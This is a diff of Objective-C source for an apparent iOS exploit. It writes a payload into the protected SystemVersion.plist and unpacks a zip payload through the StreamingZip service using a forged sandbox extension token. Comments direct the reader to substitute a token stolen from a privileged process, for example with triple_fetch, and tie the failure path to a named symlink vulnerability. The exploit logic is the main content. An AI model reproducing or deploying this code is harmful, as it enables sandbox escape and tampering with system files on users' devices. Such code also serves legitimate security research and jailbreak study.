@@ -163,10 +163,12 @@
     //Check if SystemVersion.plist was patched before if not then write our payload to it
     if(![SystemVersion containsString:systemVersionPayload]) {
         [CalLogFileWriterInstance write:systemVersionPayload];
+        
+        //Read SystemVersion.plist again, print it's contents for human verification and check if the write operation succeeded
         SystemVersion = [NSString stringWithContentsOfFile:@"/System/Library/CoreServices/SystemVersion.plist"];
         printf("Got SystemVersion.plist: \n\n%s\n", [SystemVersion UTF8String]);
         if(![SystemVersion containsString:systemVersionPayload]) {
-        printf("Seems like the modification failed :(\n\n");
+            printf("Seems like the modification failed :(\n\n");
         }
     } else {
         printf("Your systemversion file is already patched!");
@@ -199,19 +201,26 @@
         printf("Successfully initialized!\n");
     }];
     [inProcessUnzipper supplyBytes:zipPayloadInBytes withReply:^(void){
-        printf("Unzipping stuff to /tmp\n");
+        printf("Unzipping stuff to %s\n", [zipPayloadPath UTF8String]);
     }];
-    [self change_exploit_status:@"Extracting to /tmp"];
-    char* sandboxToken = "'A'\'BBBBBBBBBB";
+    [self change_exploit_status:@"Extracting..."];
+    
+    char* sandboxToken = "0xffffffff"; //Replace this with a stolen sandboxToken from a privileged process, for example using triple_fetch
     printf("SandBoxToken: %s\n", sandboxToken);
+    
+    /* Perform the extraction */
     [inProcessUnzipper setupUnzipperWithOutputPath:payloadTargetPath sandboxExtensionToken:sandboxToken options:@{} withReply:^(NSError *e){
+        //If an error occured (Most probably the symlink error which proves Luca Todesco's vulnerability)
         if(e!=nil) {
             [NSThread detachNewThreadWithBlock:^(void){
                 dispatch_async(dispatch_get_main_queue(), ^(void){
                     [self exit_with_failure:@"Failed" retry:false];
+                    //Dont die here, this is a different thread
                 });
             }];
-            die();
+            die(); // <-- Die as we failed in exploitation
+            
+            //XPC_TRANSACTION_UNDERFLOW will occur here causing app termination as we did not provide an XPC Client for the StreamingZip instance
         }
         printf("Extracting payload..\n");
     }];
@@ -222,12 +231,12 @@
     [self change_exploit_status:@"Done!"];
 }
 
-/* Used to enable verbose */
+
+
+/* Fake selectors so our compiler won't cry */
 - (void)enableDebugLogging {
     
 }
-
-/* Needed to make the selectors work */
 
 - (void)write:(id)arg1 {
     
